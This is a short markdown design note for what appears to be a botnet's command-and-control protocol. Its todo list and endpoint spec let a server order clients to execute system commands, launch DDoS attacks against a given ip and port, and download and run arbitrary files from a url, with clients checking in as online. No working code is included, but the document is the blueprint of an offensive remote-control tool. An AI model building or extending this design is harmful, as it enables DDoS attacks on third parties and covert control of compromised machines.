# Todo {#todo}

 - [x] Create a protocol for client-server comunication
 - [x] Make it work
 - [x] Attack library
 - [ ] UUID for clients?
 - [ ] Add authentification?



# Comunication protocol {#protocol}

## Allowed methods for sending commands to clients are:

 - EXECUTE sys_command
  `POST /EXECUTE/sys_command`
execute a command

 - ATTACK target port [location]
  `POST /ATTACK/target/port`
  `POST /ATTACK/target/port/location`
DDoS an ip, optionally at location

 - STOP target port
  `POST /STOP/target/port`
stop DDoS attack

 - DOWNLOAD url [filename]
  `POST /DOWNLOAD/url`
  `POST /DOWNLOAD/url/filename`
download a file to download directory

 - RUN filename
  `POST /RUN/filename`
run file from download directory

## Notify server

  `POST /NOTIFY/ONLINE`